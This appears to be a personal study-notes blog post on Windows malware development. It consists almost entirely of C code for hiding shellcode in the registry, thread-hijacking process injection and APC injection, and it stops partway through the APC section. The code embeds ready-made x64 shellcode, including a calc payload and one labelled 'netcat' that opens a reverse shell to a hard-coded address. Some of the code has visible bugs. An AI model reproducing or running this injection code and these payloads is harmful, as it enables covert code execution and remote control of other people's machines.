---
layout: post
title: Malware Developer
image: /assets/img/notes/malwaredeveloper.jpg
related_posts:
  - /notes/_posts/2024-08-19-IntroductionToMalware.md
sitemap: false
categories: notes
---

# Malware Developer

* toc
{:toc}

## Writing registry

```c
LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey,       // A handle to an open registry key
  [in, optional] LPCSTR lpSubKey,   // The name of the registry subkey to be opened (REGISTRY constant)
  [in]           DWORD  ulOptions,  // Specifies the option to apply when opening the key - Set to 0
  [in]           REGSAM samDesired,     // Access Rights
  [out]          PHKEY  phkResult   // A pointer to a variable that receives a handle to the opened key
);

STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
```

```c
LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,            // A handle to an open registry key
  [in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
                 DWORD      Reserved,        // Set to 0
  [in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
  [in]           const BYTE *lpData,         // The data to be stored
  [in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
);

STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
```

```c
LSTATUS RegCloseKey(
  [in] HKEY hKey // Handle to an open registry key to be closed
);
```

```c
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}
```

## READING REGISTRY

```c

LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // A handle to an open registry key
  [in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
  [in, optional]      LPCSTR  lpValue,  // The name of the registry value.
  [in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
  [out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
  [out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value's data
  [in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
);

// The 'pvData' paremeter is set to 'NULL'. After the function returns, the payload size will be saved into the 'dwBytesRead' variable.
LSTATUS STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
// Use the 'dwBytesRead' variable to allocate enough memory to hold the payload
PBYTE   pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
// The 'pvData' paremeter is set to 'pBytes' which will be use to write the payload to.
LSTATUS STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
```

# Thread Hijacking

## Thread Hijacking - Remote Thread Creation

Create dummy process to get handles, inject shellcode to process and finally modify principal thread to modify RIP to the shellcode's address. Finally resume the thread to execute shellcode.

```c
CreateProcessA();
GetEnvironmentVariableA();
VirtualAllocEx();
WriteProcessMemory();
VirtualProtectEx();
GetThreadContext();
SetThreadContext();
ResumeThread();
WaitForSingleObject();
```

```c
#include <stdio.h>
#include <windows.h>

#pragma warning(disable : 4996)

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, HANDLE* hProcess, HANDLE* hThread, DWORD* dwProcessId) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("Error al encontrar variable...\n");
        return FALSE;
    }
    
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("Corriendo proceso en %s\n", lpPath);

    if (!CreateProcessA(
        NULL,                   // No module name (use command line)
        lpPath,                 // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_SUSPENDED,       // Creation flag
        NULL,                   // Use parent's environment block
        NULL,                   // Use parent's starting directory 
        &Si,                    // Pointer to STARTUPINFO structure
        &Pi)) {                 // Pointer to PROCESS_INFORMATION structure

        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    *hProcess = Pi.hProcess;
    *dwProcessId = Pi.dwProcessId;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

BOOL InjectShellcodeToProcess(HANDLE hProcess, IN PBYTE buf, IN SIZE_T bufSize, OUT HANDLE* ppAddress) {

    HANDLE pAddress = NULL;
    DWORD oldProtect = NULL;
    SIZE_T numberOfBytesWritten = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("Error al crear espacion en memoria para proceso...\n");
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, buf, bufSize, &numberOfBytesWritten)) {
        printf("Error al sobreescribir buf en memoria...\n");
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, bufSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Error al cambiar protecci√≥n de memoria...\n");
        return FALSE;
    }

    //*ppAddress = pAddress;

    return TRUE;
}

BOOL GenerateNewThread(HANDLE hThread, HANDLE ppAddress) {

    CONTEXT  ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    GetThreadContext(hThread, &ThreadCtx);

    ThreadCtx.Rip = ppAddress;

    SetThreadContext(hThread, &ThreadCtx);

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main() {
    
    HANDLE* hProcess   = NULL,
          * hThread   = NULL,
          *ppAddress = NULL;
    DWORD* dwProcessId = NULL;
    
    printf("Iniciando Creacion de proceso dummy...\n");
    getchar();
    if (!CreateSuspendedProcess("notepad.exe", &hProcess, &hThread, &dwProcessId)) {
        printf("Error al crear proceso dummy...\n");
        return -1;
    }

    printf("Iniciando inyeccion de buf en proceso...\n");
    getchar();
    if (!InjectShellcodeToProcess(hProcess, buf, sizeof(buf), &ppAddress)) {
        printf("Error al inyectar shellcode en proceso...\n");
        return -1;
    }

    printf("Iniciando Creacion de thread y ejecucion...\n");
    getchar();
    if (!GenerateNewThread(hThread, ppAddress)) {
        printf("Error el crear thread...\n");
        return -1;
    }
    
    return 0;
}
```

## Thread Hijacking - Local Thread Enumeration

```c
GetCurrentProcessId();
CreateToolhelp32Snapshot();
Thread32First();
OpenThread();
Thread32Next();
VirtualAlloc();
VirtualProtect();
GetThreadContext();
SetThreadContext();
ResumeThread();
```

```c
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>


BOOL CreateThreadSnapshot(HANDLE* hth32ThreadID, HANDLE* hThread) {

    DWORD dwPrincipalProcessId = GetCurrentProcessId();
    HANDLE hSnapshot = NULL;
    THREADENTRY32 Th32 = { .dwSize = sizeof(THREADENTRY32) };

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, &Th32);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error al crear snapshot de los hilos...\n");
        return FALSE;
    }

    if (!Thread32First(hThread, &Th32) == NULL) {
        printf("Error al leer primer registro de snapshot...\n");
        return FALSE;
    }
    
    do {
        if (Th32.th32OwnerProcessID == dwPrincipalProcessId) {
            *hth32ThreadID = Th32.th32ThreadID;
            *hThread = OpenThread(THREAD_ALL_ACCESS, NULL, Th32.th32ThreadID);
        
            if (*hThread == NULL) {
                printf("Error el obtener hthread...\n");
                return FALSE;

            }

            printf("Found process with ID: %d\n", Th32.th32OwnerProcessID);
            printf("Found thread with ID: %d\n", Th32.th32ThreadID);


            break;
        }

    } while (Thread32Next(hSnapshot, &Th32));

    return TRUE;
}

BOOL CreateThreadExecution(HANDLE hThread, PBYTE buf, SIZE_T bufSize) {
    
    CONTEXT th32 = {.ContextFlags = CONTEXT_CONTROL};
    DWORD oldProtect = NULL;
    HANDLE pAddress = NULL;
    pAddress = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("Error el crear espacion en memoria...\n");
        return FALSE;
    }
    printf("Address1... %p\n", pAddress);

    memcpy(pAddress, buf, bufSize);

    if (!VirtualProtect(pAddress, bufSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Error el cambiar proteccion de memoria...\n");
        return FALSE;
    }

    if (!GetThreadContext(hThread, &th32)) {
        printf("Error al obtener contexto de thread...\n");
        return FALSE;
    }

    th32.Rip = pAddress;

    printf("Address2... %p\n", th32.Rip);


    if (!SetThreadContext(hThread, &th32)) {
        printf("Error al Modificar contexto de thread...\n");
        return FALSE;
    }

    ResumeThread(hThread);
    getchar();
    //WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}

//unsigned char buf[] =
//"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
//"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
//"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
//"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
//"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
//"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
//"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
//"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
//"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
//"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
//"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
//"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
//"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
//"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
//"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
//"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
//"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
//"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
//"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
//"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

//netcat
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x4b\x81"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

int main() {
    HANDLE* hth32ThreadID = NULL;
    HANDLE* hThread = NULL;

    printf("Ejecutando creacion de snapshot...\n");
    if (!CreateThreadSnapshot(&hth32ThreadID, &hThread)) {
        printf("Error al recuperar thread valido...\n");
        return -1;
    }

    printf("Ejecutando thread...\n");
    if (!CreateThreadExecution(hThread, buf, sizeof(buf))) {
        printf("Error al ejecutar thread...\n");
        return -1;
    }

    printf("Saliendo...\n");
    getchar();

    return 0;
}
```

## Thread Hijacking - Remote Thread Enumeration

Enumerte process id with process name, search a thread assign to that process, allocate shellcode in a memory space and then hijack thread to execute it.

```c
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>


BOOL ProcessEnumeration(LPWSTR processName, HANDLE* hProcess, DWORD* dwProcessId) {

    HANDLE hSnapshot = NULL;
    PROCESSENTRY32  Proc = {
                    .dwSize = sizeof(PROCESSENTRY32)
    };
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error al crear snapshot...\n");
        return FALSE;
    }

    if (!Process32First(hSnapshot, &Proc)) {
        printf("Error al mapear primera valor...\n");
        return FALSE;
    }

    

    do {

        if (wcscmp(Proc.szExeFile, processName) == 0) {
            printf("IMPRIMIR...\n");
            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL) {
                printf("Error al crear handle del proceso...\n");
                return FALSE;
            }
            break;
        }

    } while (Process32Next(hSnapshot, &Proc));


_EndOfFunction:
    if (hSnapshot != NULL)
        CloseHandle(hSnapshot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}


BOOL ThreadEnumeration(DWORD dwProcessId, HANDLE* hThread, DWORD* dwThreadId) {
    HANDLE hSnapshot = NULL;
    THREADENTRY32 Thr = {
                    .dwSize = sizeof(THREADENTRY32)
    };

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error al crear snapshot de threats...\n");
        return FALSE;
    }

    if (!Thread32First(hSnapshot, &Thr)) {
        printf("Error al mapear primera valor del thread...\n");
        return FALSE;
    }



    do {

        if (Thr.th32OwnerProcessID == dwProcessId) {
            *dwThreadId = Thr.th32ThreadID;
            *hThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, Thr.th32ThreadID);
            if (*hThread == NULL) {
                printf("Error al crear handle del thread...\n");
                return FALSE;
            }
            break;
        }

    } while (Thread32Next(hSnapshot, &Thr));


_EndOfFunction:
    if (hSnapshot != NULL)
        CloseHandle(hSnapshot);
    if (*dwThreadId == NULL || *hThread == NULL)
        return FALSE;
    return TRUE;

}

BOOL ExecuteThread(HANDLE hProcess, HANDLE hThread, PBYTE buf, SIZE_T bufSize) {

    HANDLE pAddress = NULL;
    DWORD oldProtection = NULL;
    SIZE_T numberOfBytesWritten = NULL;
    CONTEXT threadctx = {.ContextFlags = CONTEXT_ALL };
    
    pAddress = VirtualAllocEx(hProcess, NULL, bufSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
    if (pAddress == NULL) {
        printf("Error el crear espacio en memoria...\n");
        return FALSE;
    }
    printf("address %p\n", pAddress);

    if (!WriteProcessMemory(hProcess, pAddress, buf, bufSize, &numberOfBytesWritten) || numberOfBytesWritten != bufSize) {
        printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\t[i] Successfully Written %d Bytes\n", numberOfBytesWritten);

    if (!VirtualProtectEx(hProcess, pAddress, bufSize, PAGE_EXECUTE_READWRITE, &oldProtection)) {
        printf("Error al cambiar proteccion de memoria...\n");
        return FALSE;
    }

    SuspendThread(hThread);
    printf("imprimir1\n");

    if (!GetThreadContext(hThread, &threadctx)) {
        printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("imprimir2\n");
    threadctx.Rip = pAddress;

    if (!SetThreadContext(hThread, &threadctx)) {
        printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("imprimir3\n");

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    printf("imprimir4\n");
    return TRUE;

}


unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x4b\x81"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

int wmain(int args, wchar_t* argv[]) {

    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;
    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;

    //Necesitamos validar la entrar del usuario
    if (args < 2) {
        printf("Uso: ThreadRemoteEnumeration.exe [processName]");
        return -1;
    }
     
    //Buscar el id del proceso con el nombre de entrada
    wprintf(L"Buscando Id del proceso: %ws\n", argv[1]);
    if (!ProcessEnumeration(argv[1], &hProcess, &dwProcessId)) {
        printf("Error el obtener id del proceso...\n");
        return -1;
    }
    printf("Id del proceso: %d\n",dwProcessId);

    //Buscar threadid del proceso encontrado
    printf("Buscando thread disponible para el proceso\n");
    if (!ThreadEnumeration(dwProcessId, &hThread, &dwThreadId)) {
        printf("No se ejecuto correctamente la enumeracion de thread\n");
        return -1;
    }
    printf("Id del thread: %d\n",dwThreadId);


    //Usar thread hijacking para ejecutar buf
    if (!ExecuteThread(hProcess ,hThread, buf, sizeof(buf))) {
        printf("Error el ejecutar thread...\n");
        return -1;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("slair");
    getchar();

    return 0;
}
```

# APC Injection

## Local APC Injection

```c
VirtualAlloc()
memcpy()
VirtualProtect()
CreateThread()
QueueUserAPC()
```
```c
// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>


// if the following is defined, the code will run apc injection using a alertable sacrificial thread,
// else if it is commented, the program will create the sacrificial thread in a suspended state, to resume it later (and run the payload)
#define RUN_BY_ALERTABLETHREAD





// x64 calc metasploit shellcode 
unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



// if RUN_BY_ALERTABLETHREAD is [not] defined (#ifndef) - then we are using an suspended thread to do apc injection

#ifndef RUN_BY_ALERTABLETHREAD

VOID DummyFunction() {

    // dummy code
    int     j = rand();
    int     i = j + rand();

}

